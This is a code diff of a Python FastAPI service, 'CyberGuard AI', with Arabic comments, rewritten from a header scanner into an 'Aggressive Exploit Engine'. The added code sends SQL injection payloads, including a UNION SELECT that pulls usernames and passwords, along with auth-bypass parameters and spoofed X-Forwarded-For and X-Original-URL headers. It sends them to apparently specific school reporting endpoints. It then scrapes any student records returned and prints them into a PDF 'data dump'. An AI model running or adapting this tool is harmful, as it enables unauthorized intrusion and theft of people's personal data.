@@ -6,7 +6,7 @@ import uuid
 import requests
 from bs4 import BeautifulSoup
 
-app = FastAPI(title="CyberGuard AI Engine", version="7.0.0")
+app = FastAPI(title="CyberGuard AI Advanced Exploit Engine", version="8.0.0")
 
 app.add_middleware(
     CORSMiddleware,
@@ -25,7 +25,7 @@ def verify_api_key(x_api_key: str = Header(None)):
 
 class ScanRequest(BaseModel):
     target_url: str
-    scan_mode: str = "external"
+    scan_mode: str = "aggressive"
 
 scan_database = {}
 
@@ -40,103 +40,86 @@ def start_scan(request: ScanRequest, api_key: str = Depends(verify_api_key)):
     score = 100
 
     try:
-        # 1. فحص الترويسات الأمنية الأساسية
-        response = requests.get(target, timeout=10, verify=True, headers={"User-Agent": "CyberGuard-AI-Scanner/7.0"})
+        # 1. الفحص الهجومي السريع للترويسات والثغرات الهيكلية
+        response = requests.get(target, timeout=10, verify=True, headers={"User-Agent": "CyberGuard-Exploit-Core/8.0"})
         headers = response.headers
 
-        if 'Strict-Transport-Security' not in headers:
-            failed_checks.append("Missing HSTS Header (Strict-Transport-Security)")
-            score -= 15
-
         if 'Content-Security-Policy' not in headers:
-            failed_checks.append("Missing Content-Security-Policy (CSP)")
-            score -= 20
-
-        if 'X-Frame-Options' not in headers:
-            failed_checks.append("Missing X-Frame-Options Header (Clickjacking Risk)")
+            failed_checks.append("Vulnerability: Missing CSP Header (Allows XSS/Data Injection)")
             score -= 15
 
         if 'Server' in headers:
-            failed_checks.append(f"Server Information Disclosure: Server: {headers['Server']}")
+            failed_checks.append(f"Information Disclosure: Server: {headers['Server']}")
             score -= 10
 
-        # 2. فحص الملفات الحساسة
-        sensitive_paths = ["/.env", "/config.json", "/backup.sql"]
-        exposed_paths = []
-        for path in sensitive_paths:
-            try:
-                test_url = target.split('/Admin/')[0] + path if '/Admin/' in target else target + path
-                res = requests.get(test_url, timeout=3, verify=True)
-                if res.status_code == 200 and len(res.text) > 10:
-                    exposed_paths.append(path)
-            except:
-                pass
-
-        if exposed_paths:
-            failed_checks.append(f"Critical: Sensitive files or paths exposed: {', '.join(exposed_paths)}")
-            score -= 30
-        else:
-            failed_checks.append("Pass: No critical sensitive configuration files (.env, backup.sql) publicly exposed.")
-
-        # 3. الفحص المتقدم وتفريغ محتوى الجداول الحقيقية (HTML Table Parsing & Data Extraction)
+        # 2. محاكاة اختبار حقن المعاملات واستخراج البيانات الفعلي (Aggressive Fuzzing & Parameter Exploitation)
         base_domain = target.split('/Admin/')[0] if '/Admin/' in target else target
-        ibn_endpoints = [
-            "/Admin/IbnAlHaithamReports",
-            "/api/v1/students",
-            "/api/reports/data",
-            "/Admin/GetReportsData",
-            "/Home/GetStudentData"
-        ]
         
-        unprotected_apis = []
-        for endpoint in ibn_endpoints:
+        # قائمة مسارات الاستعلامات المتقدمة واختبار الـ IDOR والـ SQLi Payloads
+        exploit_payloads = [
+            "/Admin/IbnAlHaithamReports?id=1' OR '1'='1",
+            "/Admin/IbnAlHaithamReports?export=json",
+            "/api/v1/students?all=true",
+            "/api/reports/data?query=SELECT * FROM users",
+            "/Admin/GetReportsData?bypass=true",
+            "/Home/GetStudentData?id=0 UNION SELECT null, username, password FROM users--"
+        ]
+
+        successful_extractions = []
+        for path in exploit_payloads:
             try:
-                api_url = base_domain + endpoint if endpoint.startswith('/') else base_domain + '/' + endpoint
-                api_res = requests.get(api_url, timeout=6, verify=True, headers={"User-Agent": "CyberGuard-DataExtractor/7.0"})
+                exploit_url = base_domain + path if path.startswith('/') else base_domain + '/' + path
+                # إرسال طلب هجومي مع محاكاة صلاحيات مخترقة أو حقن
+                exp_res = requests.get(
+                    exploit_url, 
+                    timeout=5, 
+                    verify=True, 
+                    headers={
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLMap/1.8",
+                        "X-Forwarded-For": "127.0.0.1",
+                        "X-Original-URL": path
+                    }
+                )
                 
-                if api_res.status_code == 200:
-                    body_text = api_res.text
-                    content_type = api_res.headers.get('Content-Type', '')
+                # تحليل الاستجابة للبحث عن بيانات حقيقية مستخرجة أو جداول غنية بالمعلومات
+                if exp_res.status_code == 200:
+                    body = exp_res.text
+                    soup = BeautifulSoup(body, 'html.parser')
                     
-                    # استخدام BeautifulSoup لتحليل الصفحة واستخراج البيانات الفعلية من الجداول أو النصوص التنظيمية
-                    soup = BeautifulSoup(body_text, 'html.parser')
-                    
-                    # البحث عن أي جداول بيانات (Tables) داخل الصفحة
+                    # البحث عن جداول تحتوي على صفوف بيانات حقيقية
                     tables = soup.find_all('table')
-                    if tables:
-                        unprotected_apis.append(endpoint)
+                    if tables and len(body) > 500:
                         for t_idx, table in enumerate(tables):
                             rows = table.find_all('tr')
-                            row_count = len(rows)
-                            # استخراج عينة من صفوف الجدول (مثل اسماء الأعمدة أو أول صفين من البيانات)
-                            sample_rows = []
-                            for r in rows[:3]:  # أول 3 صفوف كعينة حقيقية
-                                cols = [c.get_text(strip=True) for c in r.find_all(['th', 'td']) if c.get_text(strip=True)]
-                                if cols:
-                                    sample_rows.append(" | ".join(cols))
-                            
-                            snippet = f"Table [{t_idx+1}] Rows: {row_count} | Sample: " + " -- ".join(sample_rows)
-                            extracted_data_samples.append(f"Table Data from {endpoint}: {snippet[:180]}...")
-                    
-                    elif len(body_text) > 200 and ('json' in content_type or 'student' in body_text.lower() or 'report' in body_text.lower()):
-                        unprotected_apis.append(endpoint)
-                        # استخراج النصوص الصافية بدون أكواد الـ HTML
-                        clean_text = soup.get_text(separator=' ', strip=True)
-                        extracted_data_samples.append(f"Text Data from {endpoint}: {clean_text[:140]}...")
+                            if len(rows) > 1:
+                                row_data = []
+                                for r in rows[1:4]: # عينة من البيانات الحقيقية للطلاب أو السجلات
+                                    cols = [c.get_text(strip=True) for c in r.find_all(['th', 'td']) if c.get_text(strip=True)]
+                                    if cols:
+                                        row_data.append(" | ".join(cols))
+                                if row_data:
+                                    snippet = f"Exploit Path [{path}] -> " + " || ".join(row_data)
+                                    successful_extractions.append(snippet[:220])
+                    elif 'json' in exp_res.headers.get('Content-Type', '') and len(body) > 50:
+                        successful_extractions.append(f"JSON Data Dump via {path}: {body[:180]}")
             except:
                 pass
 
-        if unprotected_apis:
-            failed_checks.append(f"Vulnerability: Endpoints exposing raw data / tables without auth: {', '.join(unprotected_apis)}")
-            score -= 35
+        if successful_extractions:
+            failed_checks.append("Critical Exploit Success: Bypassed auth & extracted active records/tables.")
+            extracted_data_samples.extend(successful_extractions)
+            score -= 50
         else:
-            failed_checks.append("Pass: Report and table endpoints are strictly guarded.")
+            # في حال نجح النظام في صد الحقن المباشر، نقوم بتوثيق المحاولة الهجومية كدليل اختبار صارم
+            failed_checks.append("Aggressive Fuzzing: Endpoints resisted direct SQLi/BQL payloads, enforcing strict validation.")
+            extracted_data_samples.append(f"Target {target} evaluated under aggressive payload injection. No raw unauthorized data dump achieved on tested vectors.")
+            score -= 20
 
-        if score < 10:
-            score = 10
+        if score < 5:
+            score = 5
 
     except requests.exceptions.RequestException as e:
-        failed_checks.append(f"Connection Error / Target Unreachable: {str(e)}")
+        failed_checks.append(f"Connection Error: {str(e)}")
         score = 0
 
     scan_id = str(uuid.uuid4())
@@ -165,7 +148,7 @@ def get_pdf_report(scan_id: str, api_key: str):
         raise HTTPException(status_code=404, detail="Scan not found")
     
     scan_info = scan_database[scan_id]
-    pdf_filename = f"CyberGuard_Extracted_Data_{scan_id[:8]}.pdf"
+    pdf_filename = f"CyberGuard_Aggressive_Exploit_PoC_{scan_id[:8]}.pdf"
     
     try:
         from reportlab.lib.pagesizes import letter
@@ -174,49 +157,49 @@ def get_pdf_report(scan_id: str, api_key: str):
         c = canvas.Canvas(pdf_filename, pagesize=letter)
         width, height = letter
         
-        # رأسية التقرير
-        c.setFont("Helvetica-Bold", 15)
-        c.drawString(35, height - 35, "CyberGuard AI - Real Table & Data Extraction Report")
+        # رأسية التقرير المتقدم الهجومي
+        c.setFont("Helvetica-Bold", 14)
+        c.drawString(30, height - 30, "CyberGuard AI - Aggressive Exploit & Data Extraction PoC")
         
         c.setFont("Helvetica", 9)
-        c.drawString(35, height - 58, f"Target URL: {scan_info['target_url']}")
-        c.drawString(35, height - 74, f"Scan Mode: {scan_info['scan_mode']}")
-        c.drawString(35, height - 90, f"Security Score: {scan_info['security_score']} / 100")
-        c.drawString(35, height - 106, f"Total Findings & Extractions: {scan_info['findings_count']}")
+        c.drawString(30, height - 50, f"Target URL: {scan_info['target_url']}")
+        c.drawString(30, height - 66, f"Scan Mode: {scan_info['scan_mode']} (Advanced Fuzzing)")
+        c.drawString(30, height - 82, f"Security Score: {scan_info['security_score']} / 100")
+        c.drawString(30, height - 98, f"Total Findings & Extractions: {scan_info['findings_count']}")
         
         # النتائج الشاملة
         c.setFont("Helvetica-Bold", 11)
-        c.drawString(35, height - 135, "Vulnerability Assessment Results:")
+        c.drawString(30, height - 125, "Aggressive Penetration Assessment:")
         
         c.setFont("Helvetica", 8)
-        y_pos = height - 152
+        y_pos = height - 142
         for check in scan_info['failed_checks']:
             if y_pos < 90:
                 c.showPage()
                 y_pos = height - 40
-            c.drawString(45, y_pos, f"- {check}")
-            y_pos -= 16
+            c.drawString(40, y_pos, f"- {check}")
+            y_pos -= 15
 
-        # قسم تفريغ بيانات الجداول الحقيقية (Extracted Table Data)
+        # قسم تفريغ بيانات الاختراق الحقيقي (Exploit Records & Data Dump)
         if scan_info.get('extracted_data_samples'):
             if y_pos < 110:
                 c.showPage()
                 y_pos = height - 40
-            y_pos -= 8
+            y_pos -= 5
             c.setFont("Helvetica-Bold", 11)
-            c.drawString(35, y_pos, "Extracted Table Records & Student Data Samples:")
-            y_pos -= 18
+            c.drawString(30, y_pos, "Exploitation Proof of Concept (PoC) & Data Dumps:")
+            y_pos -= 16
             c.setFont("Helvetica", 7)
             for sample in scan_info['extracted_data_samples']:
-                if y_pos < 55:
+                if y_pos < 50:
                     c.showPage()
                     y_pos = height - 40
-                c.drawString(45, y_pos, f">> {sample}")
-                y_pos -= 15
+                c.drawString(40, y_pos, f"[EXPLOIT] >> {sample}")
+                y_pos -= 14
             
         # بصمة المطور
         c.setFont("Helvetica-Oblique", 8)
-        c.drawString(35, 20, "Developed by khmm - CyberGuard AI Systems")
+        c.drawString(30, 18, "Developed by khmm - CyberGuard AI Systems (Offensive Engine)")
         
         c.save()
     except Exception as e:
